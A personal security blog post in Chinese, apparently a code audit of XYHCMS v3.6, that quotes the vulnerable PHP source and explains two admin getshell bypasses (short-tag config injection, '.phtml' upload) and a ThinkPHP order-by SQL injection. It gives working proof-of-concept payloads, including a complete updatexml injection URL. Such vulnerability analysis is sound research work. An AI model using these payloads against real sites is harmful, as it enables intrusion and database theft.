@@ -1,0 +1,791 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="代码审计,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="在CNVD上看一看有什么新的漏洞，看到了XYHCMS后台高危洞，决定看一看审一波  xyhcms v3.6 后台命令执行官网下载最新版代码，看到是v3.6，按照流程直接安装，然后进入后台 根据CNVD上提到的文件，搜索一下  根据经验，查看SystemController.class.php，可以看到对后台过滤不严 在 site()函数中，查看第214行开始 1234567891011121314">
+<meta name="keywords" content="代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xyhcms v3.6 代码审计">
+<meta property="og:url" content="http://yoursite.com/2020/02/03/xyhcms-3-6/index.html">
+<meta property="og:site_name" content="Moyu&#39;s blog">
+<meta property="og:description" content="在CNVD上看一看有什么新的漏洞，看到了XYHCMS后台高危洞，决定看一看审一波  xyhcms v3.6 后台命令执行官网下载最新版代码，看到是v3.6，按照流程直接安装，然后进入后台 根据CNVD上提到的文件，搜索一下  根据经验，查看SystemController.class.php，可以看到对后台过滤不严 在 site()函数中，查看第214行开始 1234567891011121314">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/2020/02/03/xyhcms-3-6/image-20200203122645702.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/03/xyhcms-3-6/image-20200203130608242.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/03/xyhcms-3-6/image-20200203131209331.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/03/xyhcms-3-6/image-20200203131339476.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/03/xyhcms-3-6/image-20200203134810612.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/03/xyhcms-3-6/image-20200203135009280.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/03/xyhcms-3-6/image-20200203135215853.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/03/xyhcms-3-6/image-20200203140929832.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/03/xyhcms-3-6/image-20200203195949795.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/03/xyhcms-3-6/image-20200203200405682.png">
+<meta property="og:updated_time" content="2020-02-15T03:34:26.646Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="xyhcms v3.6 代码审计">
+<meta name="twitter:description" content="在CNVD上看一看有什么新的漏洞，看到了XYHCMS后台高危洞，决定看一看审一波  xyhcms v3.6 后台命令执行官网下载最新版代码，看到是v3.6，按照流程直接安装，然后进入后台 根据CNVD上提到的文件，搜索一下  根据经验，查看SystemController.class.php，可以看到对后台过滤不严 在 site()函数中，查看第214行开始 1234567891011121314">
+<meta name="twitter:image" content="http://yoursite.com/2020/02/03/xyhcms-3-6/image-20200203122645702.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/02/03/xyhcms-3-6/">
+
+
+
+
+
+  <title>xyhcms v3.6 代码审计 | Moyu's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Moyu's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/03/xyhcms-3-6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Moyu">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/wlp.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Moyu's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">xyhcms v3.6 代码审计</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-02-03T11:30:16+08:00">
+                2020-02-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  964
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>在CNVD上看一看有什么新的漏洞，看到了XYHCMS后台高危洞，决定看一看审一波</p>
+<p><img src="image-20200203122645702.png" alt="image-20200203122645702"></p>
+<h3 id="xyhcms-v3-6-后台命令执行"><a href="#xyhcms-v3-6-后台命令执行" class="headerlink" title="xyhcms v3.6 后台命令执行"></a>xyhcms v3.6 后台命令执行</h3><p>官网下载最新版代码，看到是v3.6，按照流程直接安装，然后进入后台</p>
+<p>根据CNVD上提到的文件，搜索一下</p>
+<p><img src="image-20200203130608242.png" alt="image-20200203130608242"></p>
+<p>根据经验，查看SystemController.class.php，可以看到对后台过滤不严</p>
+<p>在 site()函数中，查看第214行开始</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$data = I(<span class="string">'config'</span>, <span class="keyword">array</span>(), <span class="string">'trim'</span>);</span><br><span class="line"><span class="comment">//&lt;script\s+language[\s=]+["\']*php["\']*[^&gt;]*?\&gt;.*?&lt;\/script&gt;</span></span><br><span class="line">$preg_param = <span class="string">'/&lt;script\s+language[\s=]+["\']*php["\']*[^&gt;]*?\&gt;/is'</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($data <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">    <span class="keyword">if</span> (stripos($val, <span class="string">'&lt;?php'</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        $data[$key] = preg_replace(<span class="string">'/&lt;\?php(.+?)\?&gt;/i'</span>, <span class="string">''</span>, $val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (stripos($val, <span class="string">'&lt;script'</span>) !== <span class="keyword">false</span> &amp;&amp; stripos($val, <span class="string">'php'</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        $data[$key] = preg_replace(<span class="string">'/&lt;script\s+language[\s=]+["\']*php["\']*[^&gt;]*?\&gt;.*?&lt;\/script&gt;/i'</span>, <span class="string">''</span>, $val);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stripos($data[$key], <span class="string">'&lt;?php'</span>) !== <span class="keyword">false</span> || preg_match($preg_param, $data[$key])) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;error(<span class="string">'禁止输入php代码'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>并没有对短标签进行过滤，所以可以在后台的配置文件中写入如下内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20200203131209331.png" alt="image-20200203131209331"></p>
+<p>然后直接访问配置文件就可以了</p>
+<p><img src="image-20200203131339476.png" alt="image-20200203131339476"></p>
+<p>总结一下这个漏洞，个人感觉后台getshell的洞都挺鸡肋的，开发人员想到了过滤，但是采取黑名单的方式过滤难免产生过滤不严格的问题。</p>
+<h3 id="xyhcms-v3-6-后台文件上传getshell"><a href="#xyhcms-v3-6-后台文件上传getshell" class="headerlink" title="xyhcms v3.6 后台文件上传getshell"></a>xyhcms v3.6 后台文件上传getshell</h3><p>根据CNVD，还有一个文件上传getshell的洞，接着看源码，在第246行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($data[<span class="string">'CFG_UPLOAD_FILE_EXT'</span>])) &#123;</span><br><span class="line">    $data[<span class="string">'CFG_UPLOAD_FILE_EXT'</span>] = strtolower($data[<span class="string">'CFG_UPLOAD_FILE_EXT'</span>]);</span><br><span class="line">    $_file_exts = explode(<span class="string">','</span>, $data[<span class="string">'CFG_UPLOAD_FILE_EXT'</span>]);</span><br><span class="line">    $_no_exts = <span class="keyword">array</span>(<span class="string">'php'</span>, <span class="string">'asp'</span>, <span class="string">'aspx'</span>, <span class="string">'jsp'</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($_file_exts <span class="keyword">as</span> $ext) &#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array($ext, $_no_exts)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">'允许附件类型错误！不允许后缀为：php,asp,aspx,jsp！'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>又是黑名单过滤，这里可以采用phtml，php5，php7等方式，但是需要.htaccess解析这些文件后缀，还是有局限性的</p>
+<p>这里以上传phtml为例，先在允许附件类型里加上phtml</p>
+<p><img src="image-20200203134810612.png" alt="image-20200203134810612"></p>
+<p>然后直接上传水印图片，上传的文件内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89A&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上传后直接回显了文件路径</p>
+<p><img src="image-20200203135009280.png" alt="image-20200203135009280"></p>
+<p>访问发现成功上传getshell</p>
+<p><img src="image-20200203135215853.png" alt="image-20200203135215853"></p>
+<p>总结一下，黑名单过滤是万恶之源</p>
+<h3 id="xyhcms-v3-6-前台sql注入"><a href="#xyhcms-v3-6-前台sql注入" class="headerlink" title="xyhcms v3.6 前台sql注入"></a>xyhcms v3.6 前台sql注入</h3><p>然后想一想之前红帽杯遇到过一个xyhcms的sql注入的洞，不知道新版本修了没，尝试测一下，发现这个洞还在，找了一下CNVD</p>
+<p><img src="image-20200203140929832.png" alt="image-20200203140929832"></p>
+<p>这里就分析一下漏洞原理以及利用方式了</p>
+<p>漏洞原理为ThinkPHP在处理order by排序时，当排序参数可控且为关联数组(key-value)时，由于框架未对数组中key值作安全过滤处理，攻击者可利用key构造SQL语句进行注入</p>
+<p>漏洞代码如下(Include/Library/Think/Db/Driver.class.php 第667行)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseOrder</span><span class="params">($order)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(is_array($order)) &#123;</span><br><span class="line">        $array   =  <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">foreach</span> ($order <span class="keyword">as</span> $key=&gt;$val)&#123;</span><br><span class="line">            <span class="keyword">if</span>(is_numeric($key)) &#123;</span><br><span class="line">                $array[] =  <span class="keyword">$this</span>-&gt;parseKey($val);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $array[] =  <span class="keyword">$this</span>-&gt;parseKey($key).<span class="string">' '</span>.$val;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $order   =  implode(<span class="string">','</span>,$array);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> !<span class="keyword">empty</span>($order)?  <span class="string">' ORDER BY '</span>.$order:<span class="string">''</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到当order为数组时，并未对key进行过滤，直接拼接</p>
+<p>然后查找函数调用，全局搜索orderby，在App/Api/Controller/LtController.class.php中发现传入了orderby</p>
+<p>第62行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$order_by = I(<span class="string">'orderby'</span>, <span class="string">'point DESC,id DESC'</span>);</span><br></pre></td></tr></table></figure>
+
+<p>在I函数中并没有进行过滤，然后在第177行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_list = D2(<span class="string">'ArcView'</span>, $_table_name)-&gt;nofield($nofield)-&gt;where($where)-&gt;order($order_by)-&gt;limit($limit)-&gt;select();</span><br></pre></td></tr></table></figure>
+
+<p>执行了查询，可以在parseOrder处下个断点看一下</p>
+<p><img src="image-20200203195949795.png" alt="image-20200203195949795"></p>
+<p>可以看到已经带入执行，接下来找回显点，或者采用时间盲注，这里可以根据日志直接报错注入，日志的位置如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/xyhcms/App/Runtime/Logs/Api/20_02_03.log</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，成功得到了查询结果</p>
+<p><img src="image-20200203200405682.png" alt="image-20200203200405682"></p>
+<p>payload如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/xyhcms/index.php/Api/Lt/alist?orderby[updatexml(1,concat(0x3a,(select%20user()),0x3a),1);]=1</span><br></pre></td></tr></table></figure>
+
+<p>总结来说，这个cms的主要采用黑名单来进行过滤，而且对传入的参数过滤也不严格，导致了这些高危漏洞</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/01/29/buu-new-year/" rel="next" title="buu红包题writeup">
+                <i class="fa fa-chevron-left"></i> buu红包题writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/02/04/gilacms-1-11-8/" rel="prev" title="gilacms 1.11.8 代码审计">
+                gilacms 1.11.8 代码审计 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/wlp.jpg" alt="Moyu">
+            
+              <p class="site-author-name" itemprop="name">Moyu</p>
+              <p class="site-description motion-element" itemprop="description">hack for fun</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">31</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#xyhcms-v3-6-后台命令执行"><span class="nav-number">1.</span> <span class="nav-text">xyhcms v3.6 后台命令执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xyhcms-v3-6-后台文件上传getshell"><span class="nav-number">2.</span> <span class="nav-text">xyhcms v3.6 后台文件上传getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xyhcms-v3-6-前台sql注入"><span class="nav-number">3.</span> <span class="nav-text">xyhcms v3.6 前台sql注入</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Moyu</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
